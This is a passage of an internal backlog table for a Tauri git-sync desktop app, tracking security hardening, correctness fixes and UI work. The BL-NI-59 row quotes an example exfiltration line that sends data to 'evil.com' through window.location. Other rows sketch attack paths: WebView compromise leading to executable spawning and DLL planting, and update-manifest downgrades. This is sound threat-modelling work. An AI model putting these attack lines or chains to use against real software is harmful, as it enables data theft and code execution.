| BL-NI-52 (pre-pull dirty re-check fails OPEN) | The H-1 guard that re-inspects dirtiness immediately before the one mutating `git pull --ff-only` reads `git.inspect(path).map(|i| i.is_dirty).unwrap_or(false)` (`crates/reposync-core/src/repo.rs:700`): a git2 inspect error evaluates to `false` = "not dirty" and PROCEEDS, the opposite posture from every other unknown-state site in the engine (which fail closed toward skip). The never-destructive promise still holds (git's own `--ff-only` refusal and checkout safety backstop it, and the repo just became unopenable so the CLI pull likely also fails), so this is Low, but the one-character fix aligns it with the rest of the engine: `unwrap_or(true)` (treat an unreadable tree as dirty and skip). **2026-07-12 RESOLVED:** changed to `unwrap_or(true)` at `repo.rs:700`, so an inspect error at the H-1 re-check resolves to "dirty" and skips (fail closed), matching every other unknown-state site in the engine; the never-destructive promise is unchanged (git's own `--ff-only` refusal was already a backstop). Test `execute_action_h1_recheck_fails_closed_on_inspect_error` (a non-repo path makes `inspect` error, and the pull is skipped) passes; clippy `-D warnings` clean. | Correctness review PS-1 (`_local/audit/2026-07-10_fable-audit/05_CORE-CORRECTNESS-REVIEW.md`). | done |
| BL-NI-53 (WebView compromise -> settings_set -> editor/terminal spawn; needs CSP + write validation) | The 32 app commands are not capability-gated (Tauri capabilities gate the plugin/core surface, not custom commands), so a compromised WebView can call `settings_set` to point `editor_command`/`terminal_command` at an existing executable (the write path validates only cadence/retention/quiet-hours, not these), then `repo_open_editor`/`repo_open_terminal` to spawn it (`commands/mod.rs:412-434,502-603` -> `opener.rs:356-428`) - LOLBIN execution, and because the terminal is spawned with `current_dir(repo_path)`, DLL-search-order planting in an attacker-influenced repo dir = RCE. Gated on XSS (none known today; React escapes uniformly), but `csp:null` (`tauri.conf.json`) removes the second layer, so one future regression opens the whole tree. The threat model argues a restrictive CSP (audit A-2) is the single highest-leverage move here (it backstops the always-available app commands, unlike the A-1 plugin-capability trim). Pair CSP with A-1 and add write-time validation (allowlist or existence+extension check) of `editor_command`/`terminal_command`. Overlaps SPEC-01 (security-hardening). | Security review R5 (`_local/audit/2026-07-10_fable-audit/06_THREAT-MODEL.md`); audit A-1/A-2. | open (two of four layers landed) - the CSP (BL-NI-58, runtime-verified 2026-07-22) and the navigation guard (BL-NI-59, runtime-verified 2026-07-22) are in. STILL OPEN: the audit A-1 plugin-capability trim, and write-time validation of the configured editor/terminal executables. Both remaining layers are the ones that actually narrow what a compromised WebView can reach, so this row does NOT close on the CSP work alone. Note the capability trim is not unattended-safe: an over-trim fails at runtime in a way no gate in this repo can see, so it needs a packaged dogfood to confirm. |
| BL-NI-54 (activity log stores attacker git output unbounded: disk-DoS + future-PAT leak) | The activity log persists `raw_command`/`raw_stdout`/`raw_stderr` verbatim with no size cap and no redaction (`activity.rs:62-96`) and returns them over IPC; `AppError::CommandFailed`/`FetchFailed` also carry raw git stderr to the wire. Attacker-controlled git stderr (from a malicious remote) and ref names land in the DB and the WebView feed. Three coupled risks: (1) disk-DoS - a remote emitting huge stderr on each scheduled fetch grows the DB without bound (cap needed); (2) latent stored-XSS - React escapes today, so `csp:null` leaves it un-backstopped (couples to BL-NI-53); (3) future-PAT leak - a V1.1 authenticated-remote path that puts a token in the URL would persist it verbatim (no redaction anywhere). Fixes: truncate `raw_*` to a cap before persist; add a `https://user:token@` redaction pass BEFORE the V1.1 PAT path lands (see BL-V11-02); keep render escaped + add CSP. Today the capture is argv-only and secret-free, so this is forward-looking hardening. | Security review R6 + correctness review DS-5 (`_local/audit/2026-07-10_fable-audit/`). | done - both halves shipped; the residual closed 2026-08-02 and the label is corrected here (it still read "residual: redaction open" after the redaction work landed). The disk-DoS half shipped 2026-07-31 (PR #31): `raw_command`/`raw_stdout`/`raw_stderr` are capped at 16 KiB by one shared `cap_stream` at the single write sink, with an explicit truncation marker, cutting on a character boundary so arbitrary UTF-8 git output cannot panic the writer. Redaction decided and shipped 2026-08-02: `redact::redact_secrets` runs at CAPTURE in `run_git`, not at the activity write sink, because captured stderr also becomes `AppError::FetchFailed` (which crosses IPC and renders on screen) and is interpolated into tracing events in the rotating log - cleaning at the database boundary would have covered one of three consumers. It runs before the size cap, since capping first can bisect a token. Structural URL-userinfo removal plus a deliberately SHORT token-prefix list and `Authorization:` headers; the promise is worded to match, because claiming "secrets are redacted" would stop users reading logs before sending them. **Scope correction worth keeping:** the original justification - that git echoes credential-bearing remote URLs on fetch failure - was checked and is FALSE on git 2.40.1, which sanitizes userinfo itself on both the connection-refused and DNS-failure paths, and none of the four captured commands prints a remote URL anyway. This is therefore defense in depth against git-version drift, future captured commands, `GIT_TRACE` output, and the V1.1 keyring PAT, not the repair of a demonstrated leak. This no longer blocks the Activity receipt UI, which shipped 2026-08-04 and is the first consumer to render the captured streams on screen. |
| BL-NI-55 (updater residuals: manifest-vs-artifact downgrade + key custody) | Two residual edges around the (otherwise sound) updater core. (a) Manifest-vs-artifact trust gap: Tauri's updater trusts the UNSIGNED `latest.json` for the version string while the minisign signature covers only the artifact bytes, so a party who can rewrite `latest.json` on the endpoint (GitHub release/account compromise, not mere MITM) can advertise an OLD, legitimately-signed, known-vulnerable artifact under a HIGHER version number, bypassing the semver downgrade check (`updates.rs:169`) and installing a vulnerable-but-valid build. Fix: verify the downloaded artifact version equals the manifest version after download, and/or pin an update floor. (b) Key custody: the minisign private key is the entire integrity boundary; document offline/HSM custody plus a rotation runbook. Both LOW likelihood (need release-write access or a key leak) but apex blast radius. | Security review R4a/R4b (`_local/audit/2026-07-10_fable-audit/06_THREAT-MODEL.md`); relates to BL-DEC-01, BL-V11-07. | open |
| BL-NI-56 (SPEC-06 budgeter reserve/commit redesign is UNSAFE as specced) | The performance spec's proposed D-2 change (release the shared `RateBudgeter` mutex during the GitHub network window via a `reserve`/`commit` split) is unsafe as first written and MUST NOT be implemented as-is. The current single lock hold does DOUBLE duty (documented at `github.rs:1065-1073`): it bounds overspend AND serializes same-repo fetches (there is no separate per-repo metadata lock). The reserve/commit split preserves the overspend ceiling but drops the same-repo guard (two concurrent refreshes of one repo would both fetch and clobber the `repo_remote_meta` row) and can leak a reserved slot on a panic between reserve and commit (`prune` never ages out `reserved`). If D-2 is ever pursued it must add a per-repo in-flight guard AND an RAII reservation token, with tests for both. Simpler safe path: the BL-NI-49 reqwest timeout already removes the production wedge (CC-1) without the redesign, so prefer keeping the single lock. SPEC-06 carries a correction block. | Correctness review + SPEC-06 D-2 correction (`_local/audit/2026-07-10_fable-audit/05_CORE-CORRECTNESS-REVIEW.md`). | watch |
| BL-NI-57 (low-severity core hardening batch from the 2026-07-10 depth review) | A batch of low-severity, individually-small hardenings surfaced by the core correctness + threat depth review, grouped to avoid table sprawl. **Policy engine:** PS-2 - document (or set `-c submodule.recurse=false` on the pull) that the dirty guard is superproject-scoped and submodule work relies on git's checkout safety; PS-3 - an auth failure with an unrecognized stderr signature classifies as "network" and retries rather than pausing promptly (broaden the auth signature set); PS-4 - the divergence check trusts the ahead/behind pair invariant with no local guard (add a defensive guard so a future refactor can't regress into divergence-blindness). **Persistence:** DS-4 - the OneDrive-rooted data-dir backstop warns via an invisible `eprintln` only (route it through the tracing log / a one-time UI notice; relates to BL-NI-12 and the observability spec); DS-6 - the activity-retention read is unclamped at the high end (`activity.rs`), clamp the upper bound and use `saturating_sub`/`saturating_mul` in the sweep cutoff. **At rest:** R7 - the DB is plaintext in `%LOCALAPPDATA%` (acceptable for V1: no secrets stored; revisit if a PAT lands). Note: DS-3 (non-atomic `repo::add`) is the same defect already tracked as BL-NI-07, not duplicated here. | Correctness review PS-2/3/4, DS-4/6 + security review R7 (`_local/audit/2026-07-10_fable-audit/`). | open (DS-4 half done) - 2026-07-31 the OneDrive-rooted data-dir backstop now emits a structured `db.onedrive_rooted` WARN to the rotating log instead of an `eprintln!` that, in a `windows_subsystem = "windows"` release build, went to a stderr not attached to anything. DS-4's other half - a one-time UI notice - is still open, and so are PS-2, PS-3, PS-4, DS-6, and R7. |
| BL-NI-39 (silent git_executable_path fallback gives no signal) | An explicit-but-wrong `git_executable_path` is silently ignored when a PATH git exists: the probe falls back and the engine keeps working, so the user gets no signal that their configured path is not the one actually in use. Proposal: surface a non-blocking warning in Settings when the active engine's source differs from the configured explicit path. Low severity: the app stays fully functional (the fallback is by design); this is a transparency gap, not a functional defect. **DONE 2026-08-07.** `resolve_and_probe` tries the explicit `settings.git_executable_path` first and then falls through to bare `git` on PATH and the well-known install locations. The FALLBACK is correct and is kept: a wrong path in Settings should not stop the app working. What was wrong is that it happened in complete silence, and the two halves of the evidence were already on screen in different places: the Settings field showed the CONFIGURED value, the Diagnostics card showed the RESOLVED one, and nothing ever compared them. A user who typed one wrong character got a working RepoSync running a git they did not choose, forever, with no signal anywhere. `discover::explicit_path_honored` is a pure comparison with six tests. It normalizes separators and ignores case on Windows deliberately: `C:\Program Files\Git\cmd\git.exe` and `c:/program files/git/cmd/git.exe` are the same file, and a warning that fires on two spellings of the same path is one people learn to skip. It does NOT canonicalize, because `canonicalize` needs the file to still exist and that is precisely not guaranteed in the case worth catching. Two additive `Diagnostics` fields, a warning on the card naming both paths, and a `[CONFIGURED PATH IGNORED: ...]` marker in the copyable report. Two non-conditions are tested explicitly because each would have made the warning fire on a healthy setup: nothing configured is not a mismatch, and a configured path with NO git resolved is not a mismatch either (that is `GitAvailability::Unavailable`, already reported on its own field, and flagging it twice would send the user after the wrong problem). Two adversarial-review findings fixed before merge, the first of which is the exact false warning this feature exists to AVOID. (a) `diagnostics_get` read the engine and the settings independently, and `settings_set` persists the new path BEFORE probing and swapping the engine, so a refresh landing between those steps would compare the NEW path against the OLD engine, report the configured path as ignored, and leave that alarm on screen for a save that then succeeded perfectly. Both are now read as one snapshot under the existing `settings_write_lock` (BL-NI-35's guard). Holding it can make a refresh wait for an in-flight save including its `git --version` probe, which is the right trade: a diagnostics panel that waits a moment beats one that lies. **Worth recording that my own pre-review analysis of false positives checked path FORMAT and never considered TIME.** (b) The `bool` had `true` meaning four different things (honored / nothing configured / settings unreadable / no git at all), which is the same overclaiming this field was added to fix, one level up. It is now `Option<bool>` where `None` means no comparison was made and each underlying reason is reported by the field that owns it. The frontend guard had to change with it: `Option<bool>` reaches TypeScript as `boolean | null`, and `!null` is `true`, so a naive negation would have fired the warning in exactly the three no-comparison cases and been WORSE than the bool. A failed settings read is no longer swallowed silently either; it logs under a new `diagnostics.settings_read_failed` event, because a panel that quietly stops making one of its claims is the class of silence this whole run has been closing. | Phase 2 dogfood report (`_LOCAL/dogfood/2026-07-05_phase-2-dogfood.md`), verified item 18 (bad-git-path contract) and paper cut 5. | done 2026-08-07 |
| BL-NI-40 (tray "Open recent" submenu is a startup snapshot) | The tray "Open recent" submenu (E-13, P3-C) is populated ONCE at launch from `store::recent_repos`, so a repo added or checked after launch does not appear (and a removed one lingers) until the app restarts. Native tray menus have no async "about to show" hook in Tauri v2, so refreshing it means rebuilding the menu on a signal (e.g. after each scheduler tick / check-all, or on `repo:state-changed`) via `TrayIcon::set_menu`. Low severity: the submenu still opens the right folders for the repos present at launch, which is the common resident-utility case. **DONE 2026-08-07.** The tray now holds its own `TrayHandles` managed state (the tray icon, the fixed menu items, and the last recent set) and `refresh_recent_menu` rebuilds the submenu via `TrayIcon::set_menu`. **Reusing the FIXED items across rebuilds is load-bearing, not an optimization:** the menu-event handler captures a clone of the pause item so a toggle can flip its label, and rebuilding that item would leave the handler holding a stale handle so the label would silently stop updating - a bug no gate in this repo could see. Only the recent submenu is ever reconstructed, through the SAME `compose_menu` helper the launch path uses, so the two cannot drift. Managed as its own state rather than folded into `AppState`, which is already constructed and managed by the time the tray builds (deliberately: a menu click must never race an unmanaged state). Refresh triggers: a manual `check_now`, a `check_all` burst (once for the whole burst, not per repo), a scheduler tick that actually ran repos, and `repo_remove` - the last because a removed repo lingering in the menu is the most confusing version of this bug. `repo_remove` gained an `app: tauri::AppHandle` parameter, which Tauri INJECTS rather than taking from JavaScript, so `bindings.ts` is unchanged (verified). Every call is a no-op unless the list actually moved, compared on a key of (id, name) rather than ids alone so a RENAME updates the label too; the tick loop fires every minute for the process lifetime and would otherwise rebuild a native menu sixty times an hour. Four tests cover the key, which is the only part testable without a running tray. **Runtime confirmation is a dogfood item:** everything else here is Tauri calls, and a menu that stops responding would look exactly like one that works until someone clicks it. **The first design was WRONG on Windows and the review caught it.** I reused the fixed menu items across rebuilds so the handler's captured pause handle would stay valid, and documented that as load-bearing. It is backwards: in `muda` 0.19.3, adding an item to a menu pushes that menu's two HMENUs onto the item's `parents_hemnu`, and `Menu::drop` destroys those handles WITHOUT removing the registrations (verified in the vendored source: drop clears `root_menu_haccel_stores` and not `parents_hemnu`). A shared item therefore grows that vector by two entries per rebuild forever, and `set_text`, which the pause toggle calls, walks the whole vector issuing `SetMenuItemInfoW` against destroyed handles. In a tray app that runs for weeks that is unbounded growth plus writes to dead handles. **Every item is now rebuilt per menu** and the CURRENT pause item lives in managed state, so the handler looks it up rather than capturing it. Three more review fixes came with that: the refresh is serialized end to end by an async mutex (two concurrent refreshes could otherwise install menus out of order and leave the gate recording the one that is NOT displayed); `last_recent` advances only AFTER `set_menu` succeeds (recording it first meant a failed install left the gate claiming the menu was current, and no later refresh for that key would ever retry); and the triggers now cover `repo_add_path`, `repo_update_now`, and the STARTUP scheduler pass, which the first version missed, so the very first menu a user opened could already be stale. The rebuilt menu also reads the LIVE pause state so a refresh cannot silently reset the label to "Pause all". | E-13 (tray native menu) P3-C, 2026-07-05 (`src-tauri/src/tray.rs`). | done 2026-08-07 (runtime confirmation pending the packaged dogfood) |
| BL-NI-41 (tray "Check All Now" runs checks serially) | `check_all_enabled` (E-13, P3-C) checks enabled repos one at a time, each under its per-repo lock, rather than fanning out under a bounded semaphore the way the scheduler tick does (`DEFAULT_CONCURRENCY = 4`). Correct and safe (it still serializes per repo against the scheduler), but for a large library a serial burst of network fetches finishes slower than a bounded-concurrent one would. Consider reusing the scheduler's per-repo-mutex-under-global-semaphore composition for the manual check-all in V1.1. Low severity: it is a fire-and-forget background action, so latency is not blocking. **DONE 2026-08-07.** `check_all_enabled` now fans out through a `JoinSet` under the SCHEDULER'S OWN semaphore, exposed by a new `Scheduler::concurrency_semaphore()` beside the existing `locks()`. Reusing that semaphore rather than building a second one of the same size is the load-bearing choice: two independent caps do not compose, so a tray check-all landing during a scheduler tick would have put twice the configured number of git processes on the disk, which is exactly the number the cap exists to control. There is a test that FAILS if the accessor returns a fresh `Semaphore::new(same_size)` instead of a clone of the `Arc`, because that mistake compiles, reads identically at the call site, and silently doubles the limit. **The lock order is copied from `run_job` deliberately and is not stylistic:** per-repo mutex FIRST, global permit SECOND, permit dropped before the guard. The scheduler's module doc calls that one of exactly two load-bearing correctness properties, and reversed it lets a task holding a permit block on a mutex held by a task waiting for a permit. A task that vanishes is logged under the same `scheduler.job_aborted` event the scheduler uses and deliberately NOT counted as a checked repo or reported as a check failure, since it is neither. Admission is BOUNDED to the concurrency cap rather than spawning every target at once, after the adversarial review pointed out that the two are not equivalent: each task takes its repo's mutex BEFORE queuing for a permit, so an unbounded burst would hold one lock per repo in the library while only four did work, and a scheduled job for any of them could not even ask for a permit until the burst released that mutex, then would queue behind every remaining burst task on tokio's fair FIFO semaphore. No deadlock (both sides take mutex-then-permit) but a convoy stalling the scheduler for the whole burst. The same review found a genuine pre-existing race this had WIDENED, filed as BL-NI-72. | E-13 (tray native menu) P3-C, 2026-07-05 (`src-tauri/src/commands/mod.rs`). | done 2026-08-07 |
| BL-NI-42 (run the updater E2E install proof) | E-18's updater mechanism is unit-tested for its pure parts (version/reachability mapping, the ship-dark decision, the config-hygiene grep) and wired end to end, but the actual detect -> download -> signature-verify -> install -> relaunch loop (plus the tampered-artifact reject, offline, and downgrade negatives) is a heavy dogfood step, not run in the gate. Execute `scripts/updater-e2e.md` against a local `http://localhost` channel with a disposable test keypair and the `tauri.updater-e2e.conf.json` overlay, and record the result. Separately, the LIVE GitHub Releases endpoint proof is a public-flip item (a shipped client enforces TLS and the private endpoint 404s). | E-18 (auto-update and distribution) Phase 4, 2026-07-05 (`scripts/updater-e2e.md`). | open |
| BL-NI-43 (dashboard narrative summary card) | The Dashboard feature description ([features-and-outcomes.md](internal/release-plans/plan_v0.9.0/features-and-outcomes.md) Section 9) references a prose "Today's read" narrative daily summary card. The shipped Dashboard renders the daily-summary data (from E-11, `summary_today`) as structured stat tiles (under watch, need attention, updated today, new releases) plus the "Needs attention" list; no prose narrative is rendered. The data layer is complete (E-11 core done); this is a deferred UI enhancement to render a prose-narrative card alongside or as an alternative to the stat tiles. Deferred to V1.1 or a later refinement pass. | Features-and-outcomes.md Section 9 (Dashboard feature description) and the shipped `src/screens/dashboard.tsx`. The daily summary data structure and backend command (`summary_today`) are complete (E-11, committed). | deferred |
| BL-NI-44 (git-unavailable actionable banner) | E-03's spec anticipates a user-facing signal when git is missing or below the floor (git-not-found state). The shipped frontend has no banner for missing git; instead, a missing or unavailable git surfaces per-repo as a Failed status carrying the remediation string from the error code. The app-shell banner surface exists (E-02 database-recovery banner, `src/components/app-shell.tsx:154-184`); wiring a git-unavailable banner there is a deferred UI, pending a product decision on whether it should be a global app-wide banner, a contextual per-repo indicator, or a Settings alert. The issue surfaces today per-repo, which is honest and actionable; a pre-flight global banner is a quality-of-life enhancement. | E-03 (git engine) spec and findings from the 2026-07-04 audit; the backend detects and surfaces the state correctly, only the frontend UI is deferred. | deferred |
| BL-NI-45 (activity screen filter controls) | The Activity screen ([features-and-outcomes.md](internal/release-plans/plan_v0.9.0/features-and-outcomes.md) Section 9 and the shipped `src/screens/activity.tsx`) lists activity rows with a hardcoded filter (all repos, all action types, all statuses). The backend supports filtering (`activity_list` command accepts `repoId`, `actionType`, and `status` criteria), but the frontend has no UI to set these filters. The Activity data flow and backend command are complete; adding filter UI chips (matching the Repos screen filter chips) is a deferred UX enhancement. Users can read the full audit trail today but cannot narrow it; the UI is a V1.1 or later refinement. **CLOSED 2026-08-07 as a duplicate of BL-NI-60 (activity list has no filters), which restates it and is the row the work shipped under.** Both were open simultaneously describing the same missing controls; this one predates the receipt drawer. Kept for traceability rather than deleted. | E-09 (activity log writer) core done; the frontend hook `useActivity` and the IPC surface already support the filters, only the UI controls are missing. | done 2026-08-07 (duplicate of BL-NI-60) |
| BL-NI-46 (add-repo native folder picker) | The "Add repositories" dialog (`src/components/add-repos-dialog.tsx`) only accepts a typed/pasted path (Input at lines 121-129) plus Scan (lines 130-132) and "Add this path"; there is no native folder browser, so a user must already know and type the exact path. Add a "Browse" button that opens the OS folder picker (Windows File Explorer / macOS Finder) via `tauri-plugin-dialog`'s `open({ directory: true, multiple: false })` and writes the chosen path into the existing shared `path` state (line 22), which both Scan and Add-this-path already read (so no new state, no change to the add logic). This was ANTICIPATED but never built: `docs/internal/v1-architecture-and-decisions.md:573` specifies "Scoped FS for the folder picker. 'Add repo' / 'Scan parent' use `tauri-plugin-dialog` to pick a folder." Prerequisites, none present today (verified across `package.json`, `src-tauri/Cargo.toml`, `src-tauri/capabilities/default.json`): (1) `pnpm add @tauri-apps/plugin-dialog`; (2) `cargo add tauri-plugin-dialog` + `.plugin(tauri_plugin_dialog::init())` in `src-tauri/src/lib.rs` - an EDGE / shell-crate change, serialize per the chokepoint rule; (3) add `"dialog:default"` (or the narrower `"dialog:allow-open"`) to `src-tauri/capabilities/default.json`. First native dialog in the app; mimic the existing plugin-registration pattern at `src-tauri/src/lib.rs:201-222`. Severity: Medium (workaround = type the path). **2026-07-06 FIX APPLIED (working tree; static gates green; pending dogfood confirmation + commit):** pinned `tauri-plugin-dialog = "2"` (workspace root + `src-tauri/Cargo.toml`), registered `.plugin(tauri_plugin_dialog::init())` in `src-tauri/src/lib.rs`, granted `dialog:allow-open` in `capabilities/default.json`, added `@tauri-apps/plugin-dialog 2.7.1` via `pnpm add`, and added a `Browse` button in `add-repos-dialog.tsx` (import aliased to `openDialog` to avoid the existing `open` prop collision) that calls `open({ directory: true, multiple: false })` and populates the shared `path` state. Verified: `cargo clippy --workspace --all-targets -- -D warnings`, `pnpm typecheck`, `pnpm lint`, `pnpm build` all green. Runtime folder-picker click remains for the dogfood session. | Windows dogfood click-through 2026-07-06 (finding F-01; `_LOCAL/dogfood/2026-07-06_v0.9.0-clickthrough-findings.md`); pre-specced at `docs/internal/v1-architecture-and-decisions.md:573`. | done (shipped in PR #21, `8bfe130`; `Browse` button wired to `openDialog({ directory: true })` at `add-repos-dialog.tsx:142`. Row said `open` until 2026-07-30 despite the code having shipped) |
| BL-NI-47 (git CLI spawns flash console windows on Windows) | HIGH-visibility Windows defect: every network git operation briefly pops a black `C:\Program Files\Git\cmd\git.exe` console window, and because the scheduler ticks every 60s and fans out per due repo, a library of N repos produces a burst of ~N flashes each minute (also on manual Check / tray "Check All Now"). ROOT CAUSE CONFIRMED: the shared git-CLI chokepoint `run_git()` (`crates/reposync-core/src/git/cli.rs:26-56`) builds a `tokio::process::Command` and calls `.output().await` (line 46) with no Windows creation flag, so Windows attaches a console to each git child. All CLI ops (`fetch`, `pull_ff_only`, `ahead_behind`, `rev_parse`, `status`, `for_each_ref`) route through it, so ~90% of flashes fix at this one site. A second, lower-frequency path - the git version probes `spawn_version_ok()` / `probe_version()` (`crates/reposync-core/src/git/mod.rs:437,449`, run at startup / on `settings_set` / on `reprobe()`) - has the same gap and needs the same fix. FIX: cfg(windows)-gate `CommandExt::creation_flags(0x0800_0000)` (CREATE_NO_WINDOW) at all three sites; the idiom is already known-good in-repo at `src-tauri/src/opener.rs:360-378` but `std::os::windows::process::CommandExt` is not yet imported in `reposync-core`. No new dependency (CommandExt is std). Ruled out: `git2` (vendored libgit2) local reads spawn nothing and are immune; no `gh` process exists (GitHub intel is reqwest/HTTP); the ad hoc `Command::new("git")` sites are all `#[cfg(test)]` / `test-support` only. CORE-ONLY change (no shell-crate chokepoint), parallelizes freely; a source-level regression guard (assert `creation_flags` present) is more reliable than a runtime "no window" test. Severity: High. **2026-07-06 FIX APPLIED (working tree; static gates green; pending dogfood confirmation + commit):** cfg(windows)-gated `CREATE_NO_WINDOW` (`0x0800_0000`) at all three sites - the `run_git()` chokepoint in `crates/reposync-core/src/git/cli.rs` (tokio's inherent `creation_flags`, no import) and both `spawn_version_ok()` / `probe_version()` in `crates/reposync-core/src/git/mod.rs` (std `CommandExt` imported inside the cfg block). Verified: `cargo clippy --workspace --all-targets -- -D warnings` green ON WINDOWS, so the cfg(windows) path is genuinely compiled and checked. Runtime "no flash" confirmation remains for the dogfood session. **2026-08-07 correction:** the "working tree ... pending commit" wording above went stale. The fix has been COMMITTED since `a89bb41` ("fix: add native folder picker (F-01) and stop git console flashes (F-02)"), and a re-check of the tree confirms `CREATE_NO_WINDOW` is set at all three spawn sites plus `src-tauri/src/opener.rs`'s `open_editor`. Only the **runtime confirmation** is still outstanding, and it is deliberately not closable by any gate in this repo: it is item 1 of the packaged Windows dogfood. Noted while there: `std::process::Command` exposes `creation_flags` as a write-only setter with no getter, so no unit test can assert the flag is wired. A source-level CI guard (grep each `#[cfg(windows)]` Command construction for a `creation_flags` call in the same function) is the only mechanical protection available against a future refactor silently dropping it; recorded as optional hardening, not taken. | Windows dogfood click-through 2026-07-06 (finding F-02; `_LOCAL/dogfood/2026-07-06_v0.9.0-clickthrough-findings.md`). | open (fix committed `a89bb41`; only the runtime no-flash confirmation remains, and it is dogfood item 1) |
| BL-NI-58 (restrictive WebView CSP: replace `csp:null` with a locked-down policy + devCsp) | `tauri.conf.json` shipped with `app.security.csp: null`, so the WebView had NO Content-Security-Policy: an injected script (none known today - React escapes uniformly) could pull remote code, exfiltrate over the network, or reach the always-available app commands. Implements the CSP layer of BL-NI-53 (security review R5 / audit A-2, the single highest-leverage backstop there): a production `csp` (`default-src`/`script-src 'self'`; `connect-src ipc: http://ipc.localhost` with no external hosts for script-interface loads (fetch/XHR/WebSocket/beacon), since the frontend makes zero direct HTTP calls; `object-src 'none'`; `base-uri`/`form-action 'self'`; `frame-ancestors 'none'`) plus a `devCsp` superset that additionally allows Vite HMR (`'unsafe-inline'`/`'unsafe-eval'`, `ws://localhost:1420`) - required because the config schema injects `csp` into dev too unless `devCsp` is set. `style-src` keeps `'unsafe-inline'` plus a `style-src-attr` guard for the 6 dynamic `style={}` props (group-color swatches + lag-signal bar); Tauri auto-injects script/style nonces at build. RESIDUAL on BL-NI-53 (open): audit A-1 plugin-capability trim + editor/terminal write-time validation. LIMITATION (tracked as BL-NI-59): a CSP cannot restrict TOP-LEVEL NAVIGATION, so "no external hosts" scopes to script-interface loads only; `window.location` egress stays open and needs a Tauri navigation guard, not a CSP directive. | Security review R5 + audit A-2 (`_local/audit/2026-07-10_fable-audit/06_THREAT-MODEL.md`); implements the CSP half of BL-NI-53. | DONE - runtime-verified 2026-07-22 (jp launched the `tauri build --debug` bundle: app renders, group-color swatches show color, lag-signal bar shows width, no white screen). |
| BL-NI-59 (deny external WebView navigation: `on_navigation` guard) | The BL-NI-58 CSP restricts script-interface egress (`connect-src ipc:` only), but a CSP CANNOT restrict top-level navigation: no fetch directive governs `window.location`, and CSP3's `navigate-to` (which would have) was dropped from the spec with zero browser support - MDN's directive index lists no such directive, so adding it would be an ignored no-op that only emits an "Unrecognized Content-Security-Policy directive" console warning. Any script executing as `'self'` can therefore still exfiltrate via `window.location = 'https://evil.com/?' + data` or replace the app UI. The most plausible carrier is NOT XSS (the app has no user-controlled HTML sink; React escapes uniformly) but a COMPROMISED NPM DEPENDENCY bundled into our own JS, which `script-src 'self'` admits by construction. Fix: a navigation allowlist via `WebviewWindowBuilder::on_navigation` (Tauri's documented predicate: `url.scheme() == "tauri" \|\| (cfg!(dev) && url.host_str() == Some("localhost"))`). REAL COST: `on_navigation` is builder-time only and the `main` window is auto-created from `tauri.conf.json` `app.windows` (labels cannot collide, so `from_config` cannot re-create it), so this requires moving window creation into Rust `setup()` - title/size/`visible:false` migrate from JSON to code - and re-verifying tray show/hide plus the hidden-launch path. Breaks nothing functionally: the frontend has zero external links (`href`/`<a>`/`window.open`/`openUrl` all absent); external URLs should go via the `opener` plugin to the system browser. NOT a merge blocker for BL-NI-58 (which strictly improves on `csp:null`); note a compromised dependency could equally call the ungated IPC commands (the larger BL-NI-53 residual), so this is defense-in-depth, not the linchpin. | Codex adversarial review of the BL-NI-58 CSP branch (2026-07-16); `navigate-to` remedy rejected as a dead directive; relates to BL-NI-53 (R5). | implemented on branch `harden/webview-nav-guard` (stacked on the BL-NI-58 CSP branch); main window moved from `app.windows` config into Rust `setup()` with a host-based `on_navigation` allowlist (allows `tauri://localhost`, Windows `http(s)://tauri.localhost`, and the dev server via `tauri::is_dev()`; denies all else). Pure `allow_navigation` predicate is unit-tested. DONE - runtime-verified 2026-07-22 (jp launched the combined `tauri build --debug` bundle: app renders on Windows, no white screen, close-to-tray works). |
| BL-NI-60 (activity list has no filters despite a filtered command) | `activity_list` takes an `ActivityFilter { repo_id, action_type, status, limit }` and the Activity screen passes all-null with `limit: 60`, so the filter exists on the wire and nowhere on screen. With the receipt drawer landed (2026-08-04) the screen is now a real investigation surface, which makes the missing filters more visible: finding the one failed update for one repo means scrolling 60 rows. Cheap to add (the command already supports it); wants a small filter bar plus a decision on whether "limit 60" should become paging. **DONE 2026-08-07.** The screen now carries two chip rows (action type: All actions / Checks / Updates; outcome: Any outcome / Succeeded / Failed) built from `FilterChip`, extracted out of `repos.tsx` into `src/components/filter-chip.tsx` so Activity reuses the Repos vocabulary rather than growing a second one. The filter is passed to `activity_list` and applied in SQL, NOT used to narrow the rows already on screen: the backend applies its LIMIT after the WHERE, so client-side narrowing would search only the capped page, and an audit trail answering "no failures" when it means "none in the last 60 rows" is a lie by omission. Three honesty details shipped with it: the chips carry NO count badge (a count taken from a server-capped page describes the page, not the match, so `count` became optional on the extracted component); the empty state distinguishes "nothing matches this filter" from "no activity yet", because otherwise filtering a healthy library to Updates plus Failed renders as "RepoSync has never done anything"; and a full page now says it is truncated. `toActivityFilter` is a pure mapper in `src/lib/activity.ts` with six tests, the load-bearing one being that "all" maps to `null` and not to the string "all", which would ask for rows whose action_type is literally "all", return nothing, and render an empty screen indistinguishable from a fresh install. DELIBERATELY NOT INCLUDED, both needing a UI-direction call from jp: repo-scoped filtering (no select/dropdown primitive exists in `src/components/ui/`) and whether the 60-row cap should grow or become paging (the core's own default is 200 and its ceiling 1000). Two adversarial-review findings were fixed before merge, both about the view contradicting itself. (a) `useAsync` deliberately keeps the previous result visible across a re-run to avoid flicker, which is right for the Repos name filter (re-running on every keystroke) and WRONG here, where the deps ARE the filter: selecting Failed briefly listed successful rows under the newly active chips, and clearing a filter that matched nothing briefly claimed "No activity yet". Fixed with an opt-in `clearDataOnDepsChange` that `useActivity` alone sets, distinguishing a deps change from a manual `refetch()` so the flicker-free case is preserved. (b) The truncation notice keyed on `rows.length >= 60`, which can never be right: the request is capped, so a response cannot exceed the limit, and receiving exactly 60 is equally consistent with "there are 60" and "there are ten thousand". At exactly 60 it asserted older entries existed on no evidence, the same unfounded confidence it was added to prevent. Fixed by requesting `ACTIVITY_PAGE_LIMIT + 1` and treating the sentinel row's arrival as the evidence; `paginate()` drops it before render and is tested at 59, 60, and 61. | Noticed while building the activity receipt drawer (2026-08-04). | done 2026-08-07 |
